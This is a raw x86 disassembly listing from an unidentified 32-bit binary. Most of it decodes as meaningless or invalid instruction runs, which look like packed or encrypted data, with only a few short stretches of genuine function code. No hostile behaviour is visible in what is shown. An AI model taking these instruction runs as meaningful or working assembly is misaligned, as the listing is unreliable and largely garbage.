  4060db:	je     0x40614e
  4060dd:	loopne 0x406159
  4060df:	sub    al,al
  4060e1:	lods   eax,DWORD PTR ds:[esi]
  4060e2:	ja     0x406099
  4060e4:	cmp    ebp,DWORD PTR ds:0x2dfdd7ad
  4060ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060eb:	rdpmc  
  4060ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ee:	sub    bh,cl
  4060f0:	sub    DWORD PTR [ebx],esp
  4060f2:	xchg   esp,eax
  4060f3:	and    BYTE PTR [eax-0x40],cl
  4060f6:	push   ebx
  4060f7:	adc    al,0x5e
  4060f9:	add    al,0x71
  4060fb:	mov    esi,0x4cc00a11
  406100:	fwait
  406101:	pop    eax
  406102:	inc    esi
  406103:	xchg   esi,eax
  406104:	hlt    
  406105:	cmc    
  406106:	mov    edi,0x32fb4fd7
  40610b:	loopne 0x40617d
  40610d:	mov    bh,0xe8
  40610f:	lds    esi,FWORD PTR [edi+0x6d]
  406112:	loop   0x406164
  406114:	sbb    cl,BYTE PTR ds:[edi+eax*2]
  406118:	jno    0x40609a
  40611a:	out    0x5c,eax
  40611c:	xchg   edi,eax
  40611d:	pop    ss
  40611e:	adc    esi,DWORD PTR [esi]
  406120:	fcmovbe st,st(5)
  406122:	adc    DWORD PTR [ebx+0xe],edi
  406125:	sub    DWORD PTR [ebp-0x3e1faf09],edi
  40612b:	std    
  40612c:	sbb    cl,BYTE PTR [edi]
  40612e:	pop    ds
  40612f:	pop    ds
  406130:	fiadd  WORD PTR [edi]
  406132:	mov    ch,0x6e
  406134:	imul   edi,DWORD PTR [esi+ebx*2-0x78],0xffffffc7
  406139:	sub    BYTE PTR [ebx-0x8fc2600],ch
  40613f:	stc    
  406140:	mov    dh,0x14
  406142:	shl    DWORD PTR [edi],1
  406144:	stos   DWORD PTR es:[edi],eax
  406145:	xchg   ebx,eax
  406146:	mov    ch,0x31
  406148:	jp     0x406180
  40614a:	xchg   edx,eax
  40614b:	scas   al,BYTE PTR es:[edi]
  40614c:	and    ah,BYTE PTR [eax]
  40614e:	cs push edi
  406150:	pop    es
  406151:	or     al,0x7c
  406153:	push   DWORD PTR [ecx]
  406155:	xor    DWORD PTR [edx+0x3543d17],ebx
  40615b:	retf   
  40615c:	into   
  40615d:	mov    dh,0x88
  40615f:	sbb    al,0x83
  406161:	in     eax,dx
  406162:	jns    0x4061c9
  406164:	ret    0xbe7e
  406167:	jmp    0xb3b3477a
  40616c:	mov    esp,0x8a5078a7
  406171:	fsubr  st(3),st
  406173:	ss das 
  406175:	cld    
  406176:	and    ebx,ebp
  406178:	lahf   
  406179:	(bad)  
  40617a:	mov    ds:0x97816f0f,al
  40617f:	shl    ecx,1
  406181:	and    DWORD PTR [edi],edx
  406183:	je     0x406121
  406185:	adc    ch,0x13
  406188:	cmc    
  406189:	lahf   
  40618a:	(bad)  
  40618b:	outs   dx,BYTE PTR ds:[esi]
  40618c:	push   esp
  40618d:	int3   
  40618e:	cld    
  40618f:	push   0x347679e1
  406194:	jge    0x406166
  406196:	ss jb  0x4061bf
  406199:	and    ebp,DWORD PTR [ebp+eax*1-0x79]
  40619d:	loopne 0x40621a
  40619f:	cld    
  4061a0:	or     edi,edx
  4061a2:	push   DWORD PTR [edx+0x66]
  4061a5:	pop    ecx
  4061a6:	ja     0x4061ca
  4061a8:	mov    edi,0x7cbf6988
  4061ad:	lds    esp,FWORD PTR [ebp-0x54]
  4061b0:	aam    0x85
  4061b2:	fst    QWORD PTR [edx-0x56]
  4061b5:	out    0x3b,eax
  4061b7:	inc    ecx
  4061b8:	aaa    
  4061b9:	fild   WORD PTR [edi-0x524ead9c]
  4061bf:	lods   al,BYTE PTR ds:[esi]
  4061c0:	imul   ebx,DWORD PTR [ebx+0x23],0x3edfb67c
  4061c7:	(bad)  
  4061c8:	push   ebx
  4061c9:	scas   eax,DWORD PTR es:[edi]
  4061ca:	test   eax,0xed7a132a
  4061cf:	retf   0xcef2
  4061d2:	js     0x4061da
  4061d4:	leave  
  4061d5:	iret   
  4061d6:	das    
  4061d7:	sub    eax,0x4d760d83
  4061dc:	popa   
  4061dd:	neg    BYTE PTR [edi-0x2d96bad9]
  4061e3:	(bad)  
  4061e4:	mov    dh,0xf0
  4061e6:	push   0xfdfbc212
  4061eb:	ret    0xf39d
  4061ee:	loope  0x4061ea
  4061f0:	sub    eax,0x88490f2e
  4061f5:	push   eax
  4061f6:	or     eax,0x924ad94c
  4061fb:	and    eax,0x8e370c8e
  406200:	jle    0x40621f
  406202:	das    
  406203:	mov    al,0x31
  406205:	out    0xc2,al
  406207:	aas    
  406208:	and    DWORD PTR ds:0xe6e625a8,eax
  40620e:	and    BYTE PTR [eax+0x5d3432d4],dl
  406214:	sub    ah,BYTE PTR [esi-0x71063146]
  40621a:	sub    DWORD PTR [edx+0x5a],ecx
  40621d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621e:	cwde   
  40621f:	jl     0x406282
  406221:	mov    al,0xb4
  406223:	fmul   QWORD PTR [ebx-0x67d97cc7]
  406229:	xchg   BYTE PTR [esi-0x62],bl
  40622c:	push   0xb
  40622e:	lock inc ebx
  406230:	inc    eax
  406231:	fist   DWORD PTR [edi+eiz*4]
  406234:	mov    fs,WORD PTR [eax+0x43]
  406237:	mov    BYTE PTR [ebx+0x37],ch
  40623a:	data16 arpl WORD PTR [esi-0x75367a33],sp
  406241:	xchg   esi,eax
  406242:	shl    BYTE PTR [edx-0x7a1151db],cl
  406248:	jo     0x4062c1
  40624a:	fisttp WORD PTR [esi-0x32]
  40624d:	fld    TBYTE PTR [esi+ebp*1+0x36]
  406251:	adc    edi,DWORD PTR [eax]
  406253:	repnz lods al,BYTE PTR ds:[esi]
  406255:	jae    0x4061e2
  406257:	stc    
  406258:	sbb    dh,dl
  40625a:	pop    ebx
  40625b:	scas   eax,DWORD PTR es:[edi]
  40625c:	jl     0x406286
  40625e:	retf   
  40625f:	fnsave [eax-0x9]
  406262:	rcr    DWORD PTR [edi],cl
  406264:	loopne 0x4062d8
  406266:	iret   
  406267:	das    
  406268:	fild   QWORD PTR [ebp-0x20521d93]
  40626e:	leave  
  40626f:	inc    ebx
  406270:	outs   dx,BYTE PTR ds:[esi]
  406271:	shld   DWORD PTR [ecx-0x3d],edx,0xd6
  406276:	jg     0x4062ae
  406278:	pop    ds
  406279:	out    dx,eax
  40627a:	nop
  40627b:	sbb    BYTE PTR [esi+0x1],cl
  40627e:	stc    
  40627f:	add    al,0xcb
  406281:	retf   
  406282:	pop    esp
  406283:	ja     0x40621e
  406285:	push   ebx
  406286:	cs ds out dx,al
  406289:	mov    ch,0xd8
  40628b:	sbb    al,0x17
  40628d:	cmp    DWORD PTR [ecx-0x78],ebp
  406290:	xor    al,dl
  406292:	dec    edi
  406293:	mov    ah,0x3f
  406295:	mov    dl,0x3d
  406297:	pop    ebx
  406298:	fisttp QWORD PTR [ebx-0x3dcc078b]
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43359f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	inc    esi
  4062ed:	inc    ebx
  4062ee:	test   ah,bl
  4062f0:	xor    al,0x3b
  4062f2:	jl     0x406370
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x40636b
  4062f9:	and    BYTE PTR [ecx-0x175311b1],0x4e
  406300:	pop    ds
  406301:	adc    ch,BYTE PTR [edx]
  406303:	enter  0x27ec,0xe6
  406307:	arpl   si,dx
  406309:	call   0xec44966d
  40630e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40630f:	cmp    esi,ecx
  406311:	sbb    eax,0xb3f8b579
  406316:	loop   0x4062aa
  406318:	mov    cl,0x40
  40631a:	inc    ecx
  40631b:	dec    edx
  40631c:	sbb    al,0x63
  40631e:	pusha  
  40631f:	mov    eax,0x1d178cbd
  406324:	add    bh,BYTE PTR [eax]
  406326:	sbb    al,0xbc
  406328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406329:	outs   dx,DWORD PTR ds:[esi]
  40632a:	nop
  40632b:	ins    BYTE PTR es:[edi],dx
  40632c:	mov    cs,WORD PTR [ebp+0x53b72b89]
  406332:	fistp  WORD PTR [ecx-0xb]
  406335:	mov    bl,0xbc
  406337:	cli    
  406338:	in     al,0xa
  40633a:	fbstp  TBYTE PTR [ebx]
  40633c:	adc    eax,esp
  40633e:	and    eax,0x90303806
  406343:	cmc    
  406344:	fbld   TBYTE PTR [eax+eiz*2]
  406347:	hlt    
  406348:	jb     0x406336
  40634a:	add    DWORD PTR [eax-0x86b28d5],edx
  406350:	sub    al,0x6f
  406352:	jl     0x406304
  406354:	push   esp
  406355:	das    
  406356:	rcr    BYTE PTR [ecx],cl
  406358:	xor    DWORD PTR [edx],eax
  40635a:	loopne 0x406301
  40635c:	mov    ds,WORD PTR [edi-0x65]
  40635f:	in     eax,0xb9
  406361:	fimul  WORD PTR [eax+eiz*8+0x30]
  406365:	xor    eax,0x6bc8fb15
  40636a:	pop    esi
  40636b:	adc    al,0xbf
  40636d:	pop    ebx
  40636e:	fidiv  WORD PTR [edi+0x48]
  406371:	fnstenv [ebp-0x7bbb1510]
  406377:	sbb    eax,0xc0bf7aae
  40637c:	ror    DWORD PTR [edi+0x3d09ca67],cl
  406382:	ds mov cl,0x53
  406385:	jge    0x406330
  406387:	fs mov edi,0x3093c69f
  40638d:	sbb    al,BYTE PTR [esi]
  40638f:	xchg   ebp,eax
  406390:	dec    edx
  406391:	dec    ebx
  406392:	inc    ecx
  406393:	push   ebx
  406394:	in     al,0x7f
  406396:	cwde   
  406397:	fwait
  406398:	(bad)  
  40639a:	fimul  DWORD PTR [edi+0x60be97e4]
  4063a0:	retf   0xfb63
  4063a3:	mov    cl,0xe1
  4063a5:	and    DWORD PTR [ebx-0x36],ebp
  4063a8:	mov    edi,0x31bf3fd7
  4063ad:	inc    ecx
  4063ae:	sbb    al,BYTE PTR [ebx+0x4d]
  4063b1:	(bad)  
  4063b2:	cmp    BYTE PTR [esi+0x2bb58808],cl
  4063b8:	xor    al,BYTE PTR [eax-0x45]
  4063bb:	jecxz  0x40634c
  4063bd:	add    BYTE PTR [eax],bl
  4063bf:	popf   
  4063c0:	sti    
  4063c1:	add    al,BYTE PTR [ebp-0x634a5356]
  4063c7:	lds    eax,FWORD PTR [eax+0x48]
  4063ca:	push   eax
  4063cb:	je     0x40641a
  4063cd:	aas    
  4063ce:	addr16 mov al,ds:0x20c8
  4063d2:	lock jo 0x406446
  4063d5:	adc    DWORD PTR [ecx-0x38],esp
  4063d8:	xor    edi,ebx
  4063da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063db:	in     al,0x35
  4063dd:	xor    eax,0xb2c3a453
  4063e2:	aam    0x3b
  4063e4:	sbb    DWORD PTR [ecx-0x6b],eax
  4063e7:	ss cdq 
  4063e9:	jecxz  0x406407
  4063eb:	and    bl,BYTE PTR [esi+0x51]
  4063ee:	mov    eax,0x71cdfab9
  4063f3:	hlt    
  4063f4:	clc    
  4063f5:	mov    dl,0xcd
  4063f7:	cwde   
  4063f8:	fcomp  QWORD PTR [edx-0x78]
  4063fb:	mov    bh,0x2
  4063fd:	fs dec esp
  4063ff:	xor    dh,bh
  406401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406402:	jo     0x40643b
  406404:	xchg   BYTE PTR [edx],ah
  406406:	je     0x406389
  406408:	sti    
  406409:	mov    esp,0xc54d0e2f
  40640e:	in     eax,dx
  40640f:	lea    ecx,[ecx+esi*2+0x6a13c623]
  406416:	mov    edx,0x5d984b51
  40641b:	pop    edx
  40641c:	aad    0x30
  40641e:	mov    al,ds:0x2f6b517d
  406423:	lods   eax,DWORD PTR ds:[esi]
  406424:	and    bl,BYTE PTR [esi+0x6d85e9b4]
  40642a:	cmp    dh,BYTE PTR [edi+ebp*2]
  40642d:	dec    esp
  40642e:	es stc 
  406430:	jge    0x406400
  406432:	add    al,0xbf
  406434:	sub    al,0x8f
  406436:	icebp  
  406437:	sbb    cl,BYTE PTR [edi-0x30]
  40643a:	xlat   BYTE PTR es:[ebx]
  40643c:	enter  0x80fc,0x8c
  406440:	jmp    0x40649d
  406442:	mov    eax,ds:0x9c49169e
  406447:	add    ah,BYTE PTR [eax+0x71]
  40644a:	mov    al,0xe2
  40644c:	pushf  
  40644d:	retf   
  40644e:	inc    ebp
  40644f:	leave  
  406450:	sahf   
  406451:	std    
  406452:	out    0x13,eax
  406454:	ror    edx,0xe0
  406457:	jne    0x40646c
  406459:	std    
  40645a:	inc    BYTE PTR [edx+0x47184377]
  406460:	shr    al,0xe0
  406463:	mov    al,ds:0xcce2264b
  406468:	aas    
  406469:	(bad)  
  40646a:	sbb    edi,ecx
  40646c:	push   ss
  40646d:	jo     0x40645f
  40646f:	push   esi
  406470:	ret    0x2f42
  406473:	sub    al,0x53
  406475:	jbe    0x40649b
  406477:	jg     0x406464
  406479:	mov    edi,0x28ef4a3c
  40647e:	mov    ebx,0xa77549ff
  406483:	dec    esi
  406484:	and    BYTE PTR [esi],ah
  406486:	(bad)  
  406487:	stc    
  406488:	(bad)  
  406489:	cdq    
  40648a:	pushf  
  40648b:	sbb    bh,BYTE PTR [eax]
  40648d:	int    0xe5
  40648f:	pop    ebp
  406490:	jmp    0x40648d
  406492:	push   edx
  406493:	add    bl,al
  406495:	xor    DWORD PTR [esi+edx*1-0x50caab84],0xef543672
  4064a0:	out    dx,al
  4064a1:	sbb    DWORD PTR [ebx],edx
  4064a3:	sbb    bp,WORD PTR ds:0x6b4b35b0
  4064aa:	mov    ah,0x5a
  4064ac:	adc    edi,0xffffffcc
  4064af:	fisttp QWORD PTR [eax+ebx*1]
  4064b2:	jle    0x4064bb
  4064b4:	mov    BYTE PTR [ebp-0x20],ah
  4064b7:	mov    edi,0x29d89f24
  4064bc:	mov    cl,0x38
  4064be:	and    edi,edx
  4064c0:	cmp    eax,DWORD PTR [ebp+0x668fee96]
  4064c6:	sti    
  4064c7:	sub    edi,DWORD PTR [eax+0x31e46714]
  4064cd:	xor    BYTE PTR fs:[ebp+eiz*2-0x681c61cc],0xee
  4064d6:	pushf  
  4064d7:	jns    0x40654b
  4064d9:	loop   0x4064c0
  4064db:	xchg   edx,eax
  4064dc:	mov    edx,0xafadeddc
  4064e1:	in     al,dx
  4064e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e3:	icebp  
  4064e4:	jmp    0xf382:0xd6213693
  4064eb:	sbb    BYTE PTR [eax],ah
  4064ed:	daa    
  4064ee:	inc    ebp
  4064ef:	push   edi
  4064f0:	jo     0x406551
  4064f2:	adc    eax,0x9460ad6
  4064f7:	adc    ebx,esi
  4064f9:	in     eax,0x86
  4064fb:	xor    al,0x2c
  4064fd:	xor    eax,0xc89296cd
  406502:	push   esi
  406503:	or     BYTE PTR [ebx],0x14
  406506:	jle    0x406557
  406508:	adc    ebp,DWORD PTR [edi-0x79926f4c]
  40650e:	sub    esi,DWORD PTR [ebx-0x10]
  406511:	and    al,0x22
  406513:	stos   BYTE PTR es:[edi],al
  406514:	inc    edi
  406515:	(bad)  [ecx-0x6fa6baff]
  40651b:	mov    WORD PTR [ebx+0x1b],fs
  40651e:	add    cl,BYTE PTR [ebp-0x3adafcc4]
  406524:	sbb    DWORD PTR [eax],0x379085c
  40652a:	xchg   DWORD PTR [edx-0x5bae02fb],eax
  406530:	mov    bh,0x13
  406532:	mov    dl,0xd
  406534:	push   ecx
  406535:	mov    eax,0x4881
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4335a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43365f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43355b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4335df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4335df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4335df,ecx
  40658d:	cmp    DWORD PTR ds:0x4335df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4335df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4335df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4335df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4335df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0xec95211a
  4065de:	je     0x4065be
  4065e0:	fucomip st,st(0)
  4065e2:	lds    edi,FWORD PTR [esp+edi*2+0x30]
  4065e6:	jle    0x406664
  4065e8:	jl     0x406596
  4065ea:	enter  0xc50a,0x6
  4065ee:	cdq    
  4065ef:	pop    ss
  4065f0:	cmp    DWORD PTR [eax-0x7b],eax
  4065f3:	sub    cl,0xb6
  4065f6:	adc    DWORD PTR [eax],ecx
  4065f8:	clc    
  4065f9:	das    
  4065fa:	mov    al,ds:0xb0958e82
  4065ff:	push   ds
  406600:	neg    BYTE PTR [eax+0x41aaaf68]
  406606:	outs   dx,DWORD PTR ds:[esi]
  406607:	cs jns 0x40659e
  40660a:	sbb    DWORD PTR [ebx],ebp
  40660c:	popf   
  40660d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660e:	jg     0x4065d4
  406610:	loop   0x4065f3
  406612:	(bad)  
  406615:	mov    WORD PTR [edi],cs
  406617:	cmp    cl,BYTE PTR [ebx-0x2a]
  40661a:	xor    BYTE PTR [ebp-0x415b4f9a],ah
  406620:	mov    edi,0xec5b4c1e
  406625:	(bad)  
  406626:	mul    esp
  406628:	mov    ecx,0xc193a78a
  40662d:	leave  
  40662e:	push   esi
  40662f:	lock and al,0xb4
  406632:	jo     0x4066ac
  406634:	jle    0x40661a
  406636:	mov    ah,BYTE PTR [ebx+0x5f]
  406639:	call   0x9d2e088d
  40663e:	sbb    al,0x4d
  406640:	pop    ss
  406641:	cmp    eax,0xb6d74ec0
  406646:	xchg   esi,eax
  406647:	(bad)  
  406649:	pop    ebp
  40664a:	sub    ebp,0xa00d9d6d
  406650:	mov    esp,0xe8aef50e
  406655:	ins    BYTE PTR es:[edi],dx
  406656:	jg     0x406608
  406658:	pop    edi
  406659:	adc    DWORD PTR [esi-0x68],esp
  40665c:	fiadd  WORD PTR [edx-0x3c]
  40665f:	test   esp,0xdf75bf00
  406665:	popf   
  406666:	cmc    
  406667:	xchg   ebp,eax
  406668:	and    al,0xd0
  40666a:	add    eax,0x5cedfd4a
  40666f:	mov    edi,0x7affb393
  406674:	in     al,dx
  406675:	pusha  
  406676:	mov    ebx,0x37951280
  40667b:	push   esp
  40667c:	aad    0x74
  40667e:	sub    edi,DWORD PTR [edx+ecx*1+0x4e]
  406682:	js     0x4066fe
  406684:	push   edx
  406685:	push   ebx
  406686:	mov    ds:0x88a4bd4a,eax
  40668b:	arpl   cx,dx
  40668d:	jb     0x406624
  40668f:	das    
  406690:	pop    edx
  406691:	fmul   QWORD PTR [edx-0x5]
  406694:	pusha  
  406695:	jae    0x406653
  406697:	aad    0xb
  406699:	inc    edi
  40669a:	mov    eax,ds:0x6a5ba9aa
  40669f:	call   0xc71d:0x6c13c528
  4066a6:	sbb    DWORD PTR [edx+0x3a],edx
  4066a9:	mov    edx,0x3b081220
  4066ae:	mov    DWORD PTR [ebx-0x2d],edi
  4066b1:	inc    ebx
  4066b2:	sahf   
  4066b3:	xchg   esp,eax
  4066b4:	enter  0x42b,0xba
  4066b8:	pop    ebp
  4066b9:	mov    eax,0xcbc4f98b
  4066be:	jg     0x406674
  4066c0:	test   eax,0xa1a06695
  4066c5:	test   DWORD PTR [edx-0x68],edi
  4066c8:	sar    BYTE PTR [ecx-0x3519e94f],0xf0
  4066cf:	lea    ebp,[edx-0x60]
  4066d2:	out    0xe6,eax
  4066d4:	fst    st(1)
  4066d6:	test   eax,0x8157afe2
  4066db:	(bad)  
  4066dc:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4066de:	xchg   esi,eax
  4066df:	aam    0xf0
  4066e1:	add    dl,BYTE PTR [edx-0x387147c4]
  4066e7:	ret    
  4066e8:	xlat   BYTE PTR ds:[ebx]
  4066e9:	(bad)  
  4066ea:	mov    esi,0xe629303
  4066ef:	sbb    al,0xf8
  4066f1:	pop    esp
  4066f2:	push   0xffffff9a
  4066f4:	inc    ebx
  4066f5:	jecxz  0x4066ef
  4066f7:	clc    
  4066f8:	adc    esi,ebx
  4066fa:	in     eax,dx
  4066fb:	popf   
  4066fc:	cwde   
  4066fd:	sbb    eax,0x5539a208
  406702:	popa   
  406703:	mov    ds:0x61492242,eax
  406708:	repnz mov al,ds:0x1fe6f7d7
  40670e:	xchg   edi,eax
  40670f:	or     ebx,DWORD PTR [edx+0x3abbb8a8]
  406715:	jge    0x40674c
  406717:	push   edi
  406718:	push   esi
  406719:	sbb    eax,DWORD PTR [edx-0x3382cde7]
  40671f:	push   es
  406720:	sbb    al,0xd3
  406722:	test   BYTE PTR [edi+0x1d70c97f],bl
  406728:	inc    edi
  406729:	(bad)  
  40672a:	mov    edx,0x9313ba2c
  40672f:	sbb    DWORD PTR [ecx+0x59],edi
  406732:	add    ebp,DWORD PTR [esi-0x3a8a64d5]
  406738:	adc    BYTE PTR [ebx],dl
  40673a:	ja     0x4067b5
  40673c:	adc    DWORD PTR [ebp+0x6d],edx
  40673f:	repnz sbb al,0x5e
  406742:	fst    DWORD PTR [ecx+0x5b]
  406745:	adc    eax,0x2fc4ffe6
  40674a:	sbb    bh,bl
  40674c:	idiv   ch
  40674e:	or     cl,BYTE PTR [ecx-0x1d]
  406751:	add    DWORD PTR [edx+0x17],edi
  406754:	and    DWORD PTR [esp+ecx*2-0x11],edx
  406758:	jno    0x40674e
  40675a:	retf   0x1a68
  40675d:	test   al,0xc5
  40675f:	mov    edx,0x70fa45b8
  406764:	shl    ebx,cl
  406766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406767:	addr16 std 
  406769:	adc    ah,ah
  40676b:	add    ah,BYTE PTR [edx-0x70]
  40676e:	or     DWORD PTR [ebp-0x3c7a8de1],0x66
  406775:	add    dl,BYTE PTR [ecx+0x764571f4]
  40677b:	in     al,dx
  40677c:	pop    edx
  40677d:	or     eax,0xd52aad4d
  406782:	int    0x4b
  406784:	or     esi,DWORD PTR [ecx-0x78]
  406787:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406789:	das    
  40678a:	or     cl,BYTE PTR [edi-0x5fa4d4ce]
  406790:	jbe    0x406718
  406792:	lods   al,BYTE PTR ds:[esi]
  406793:	outs   dx,DWORD PTR ds:[esi]
  406794:	jle    0x406784
  406796:	in     eax,0xfb
  406798:	stos   BYTE PTR es:[edi],al
  406799:	add    BYTE PTR [ecx],al
  40679b:	inc    esi
  40679c:	inc    ebx
  40679d:	gs pop esp
  40679f:	xchg   DWORD PTR cs:[edx],esp
  4067a2:	add    dl,0xe9
  4067a5:	ret    0x3318
  4067a8:	and    esi,DWORD PTR [eax]
  4067aa:	ds dec esp
  4067ac:	jbe    0x4067f9
  4067ae:	loop   0x4067fa
  4067b0:	adc    BYTE PTR [ebp+0x62d8d9ee],ch
  4067b6:	cli    
  4067b7:	xor    al,0x14
  4067b9:	clc    
  4067ba:	ins    BYTE PTR es:[di],dx
  4067bc:	mov    esp,0x3ffc077c
  4067c1:	push   ds
  4067c2:	mov    bl,0xc
  4067c4:	and    eax,0xac68fbf9
  4067c9:	pop    ebx
  4067ca:	mov    ch,BYTE PTR [ebp-0x44]
  4067cd:	in     eax,0x4a
  4067cf:	add    BYTE PTR [eax],al
  4067d1:	jae    0x4067a0
  4067d3:	inc    ecx
  4067d4:	stos   BYTE PTR es:[edi],al
  4067d5:	outs   dx,BYTE PTR ds:[esi]
  4067d6:	xchg   DWORD PTR [ebp*4-0xa0d2b64],ecx
  4067dd:	(bad)  [eax]
  4067df:	and    BYTE PTR [ecx],0x7c
  4067e2:	inc    ebx
  4067e3:	inc    eax
  4067e4:	mov    edx,0x731b4cc6
  4067ea:	cmp    eax,DWORD PTR [edx+edi*1]
  4067ed:	dec    esi
  4067ee:	pop    es
  4067ef:	stc    
  4067f0:	sti    
  4067f1:	in     eax,0x7d
  4067f3:	in     al,0x6c
  4067f5:	aad    0x90
  4067f7:	xor    ecx,DWORD PTR [edi+edx*4-0x4c]
  4067fb:	push   eax
  4067fc:	jle    0x40679d
  4067fe:	(bad)  
  4067ff:	int    0xd
  406801:	enter  0x8114,0x48
  406805:	xor    BYTE PTR [eax+eiz*2],dl
  406808:	cmp    eax,0x1239d40e
  40680d:	inc    ebx
  40680e:	xor    al,0x13
  406810:	popf   
  406811:	(bad)  
  406812:	ins    BYTE PTR es:[edi],dx
  406813:	adc    al,0x26
  406815:	ss out dx,eax
  406817:	dec    ebp
  406818:	pushf  
  406819:	repz inc esi
  40681b:	inc    ebx
  40681c:	mov    al,ds:0xdb048aca
  406821:	jns    0x40680c
  406823:	out    0xd6,al
  406825:	mov    ecx,0x8a3a
  40682a:	jmp    0x406a83
  40682f:	or     ah,cl
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0xc21b34cb
  40683e:	cmp    BYTE PTR [edi+eax*8+0x7e307c7c],ch
  406845:	jl     0x4068c3
  406847:	mov    ch,0x66
  406849:	neg    BYTE PTR [eax-0x3e1f3cd8]
  40684f:	nop
  406850:	mov    ds:0x557bccba,eax
  406855:	jno    0x4068c4
  406857:	outs   dx,DWORD PTR ds:[esi]
  406858:	jb     0x40688f
  40685a:	jno    0x4067f0
  40685c:	mov    eax,ds:0x3b305602
  406861:	push   cs
  406862:	rcl    BYTE PTR [ebx-0x16],1
  406865:	and    DWORD PTR [esi+ecx*4],ebx
  406868:	out    dx,eax
  406869:	bnd jo 0x4068c9
  40686c:	hlt    
  40686d:	fs pusha 
  40686f:	sub    eax,0x3fb203e8
  406874:	mov    ds:0xc93197c6,al
  406879:	popa   
  40687a:	gs (bad) 
  40687c:	int3   
  40687d:	rcr    BYTE PTR [ecx+0x2fee43e2],cl
  406883:	pushf  
  406884:	jne    0x4068c0
  406886:	mov    esi,0xce72f1c1
  40688b:	jge    0xd3128f32
  406891:	dec    esi
  406892:	ret    
  406893:	adc    BYTE PTR [esi],ah
  406895:	jno    0x4068b8
  406897:	adc    bh,BYTE PTR [edi+ecx*8-0x39beb119]
  40689e:	cld    
  40689f:	aad    0x12
  4068a1:	push   eax
  4068a2:	scas   al,BYTE PTR es:[edi]
  4068a3:	outs   dx,DWORD PTR ds:[esi]
  4068a4:	stos   DWORD PTR es:[edi],eax
  4068a5:	jns    0x4068d0
  4068a7:	(bad)  [edx+eax*1-0x2e34847]
  4068ae:	adc    ecx,DWORD PTR [edx+0x1b]
  4068b1:	call   0xca07:0xe13fcb2d
  4068b8:	ins    DWORD PTR es:[edi],dx
  4068b9:	xor    edi,0x11
  4068bc:	and    BYTE PTR [eax-0x2856169e],dl
  4068c2:	pop    esi
  4068c3:	mov    ebx,0x99fae97d
  4068c8:	ins    BYTE PTR es:[edi],dx
  4068c9:	int    0xd8
  4068cb:	mov    eax,ds:0x3ad23935
  4068d0:	lods   al,BYTE PTR ds:[esi]
  4068d1:	ret    0x4d53
  4068d4:	jnp    0x406940
  4068d6:	gs jg  0x4068aa
  4068d9:	sbb    BYTE PTR [esi+0x50],bh
  4068dc:	aas    
  4068dd:	inc    ebp
  4068de:	xor    eax,0xb5fb12dc
  4068e3:	mul    ch
  4068e5:	xchg   DWORD PTR [ecx+0x48],esp
  4068e8:	les    esi,FWORD PTR [edx]
  4068ea:	loop   0x40694c
  4068ec:	scas   eax,DWORD PTR es:[edi]
  4068ed:	in     eax,dx
  4068ee:	mov    edi,0x87dd54e1
  4068f3:	xchg   BYTE PTR [edi-0x52f575ee],bh
  4068f9:	xor    ebp,ecx
  4068fb:	xlat   BYTE PTR ds:[ebx]
  4068fc:	push   ds
  4068fd:	jmp    0x406903
  4068ff:	ficomp DWORD PTR [ebp-0x1123732]
  406905:	or     dh,BYTE PTR [ebx+ecx*1+0x72]
  406909:	xchg   edx,eax
